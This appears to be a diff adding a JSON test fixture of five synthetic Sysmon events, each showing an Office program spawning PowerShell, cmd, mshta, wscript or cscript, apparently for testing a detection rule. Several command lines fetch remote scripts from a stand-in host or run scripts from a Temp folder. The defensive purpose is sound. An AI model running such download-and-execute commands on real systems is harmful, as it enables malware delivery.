@@ -1,0 +1,97 @@
+[
+  {
+    "event": {
+      "UtcTime": "2026-11-12T09:00:00Z",
+      "EventID": 1,
+      "Computer": "LAB-WS-01",
+      "Channel": "Microsoft-Windows-Sysmon/Operational",
+      "EventRecordID": 4101,
+      "ProcessGuid": "{00000000-0000-4000-8000-000000004101}",
+      "ProcessId": 6101,
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -NoProfile -Command Invoke-WebRequest https://example.test/a.ps1",
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" invoice.docx",
+      "User": "LAB\\finance"
+    },
+    "source": "sysmon",
+    "synthetic": true,
+    "note": "Word spawned PowerShell"
+  },
+  {
+    "event": {
+      "UtcTime": "2026-11-12T09:10:00Z",
+      "EventID": 1,
+      "Computer": "LAB-WS-02",
+      "Channel": "Microsoft-Windows-Sysmon/Operational",
+      "EventRecordID": 4102,
+      "ProcessGuid": "{00000000-0000-4000-8000-000000004102}",
+      "ProcessId": 6102,
+      "Image": "C:\\Windows\\System32\\cmd.exe",
+      "CommandLine": "cmd.exe /c whoami",
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+      "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" budget.xlsx",
+      "User": "LAB\\finance"
+    },
+    "source": "sysmon",
+    "synthetic": true,
+    "note": "Excel spawned cmd"
+  },
+  {
+    "event": {
+      "UtcTime": "2026-11-12T09:20:00Z",
+      "EventID": 1,
+      "Computer": "LAB-WS-03",
+      "Channel": "Microsoft-Windows-Sysmon/Operational",
+      "EventRecordID": 4103,
+      "ProcessGuid": "{00000000-0000-4000-8000-000000004103}",
+      "ProcessId": 6103,
+      "Image": "C:\\Windows\\System32\\wscript.exe",
+      "CommandLine": "wscript.exe C:\\Users\\finance\\AppData\\Local\\Temp\\update.js",
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+      "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
+      "User": "LAB\\finance"
+    },
+    "source": "sysmon",
+    "synthetic": true,
+    "note": "Outlook spawned Windows Script Host"
+  },
+  {
+    "event": {
+      "UtcTime": "2026-11-12T09:30:00Z",
+      "EventID": 1,
+      "Computer": "LAB-WS-04",
+      "Channel": "Microsoft-Windows-Sysmon/Operational",
+      "EventRecordID": 4104,
+      "ProcessGuid": "{00000000-0000-4000-8000-000000004104}",
+      "ProcessId": 6104,
+      "Image": "C:\\Windows\\System32\\mshta.exe",
+      "CommandLine": "mshta.exe https://example.test/launch.hta",
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE",
+      "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE\" deck.pptx",
+      "User": "LAB\\analyst"
+    },
+    "source": "sysmon",
+    "synthetic": true,
+    "note": "PowerPoint spawned mshta"
+  },
+  {
+    "event": {
+      "UtcTime": "2026-11-12T09:40:00Z",
+      "EventID": 1,
+      "Computer": "LAB-WS-05",
+      "Channel": "Microsoft-Windows-Sysmon/Operational",
+      "EventRecordID": 4105,
+      "ProcessGuid": "{00000000-0000-4000-8000-000000004105}",
+      "ProcessId": 6105,
+      "Image": "C:\\Windows\\System32\\cscript.exe",
+      "CommandLine": "cscript.exe //nologo C:\\Users\\analyst\\AppData\\Local\\Temp\\run.vbs",
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\MSACCESS.EXE",
+      "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\MSACCESS.EXE\" inventory.accdb",
+      "User": "LAB\\analyst"
+    },
+    "source": "sysmon",
+    "synthetic": true,
+    "note": "Access spawned cscript"
+  }
+]
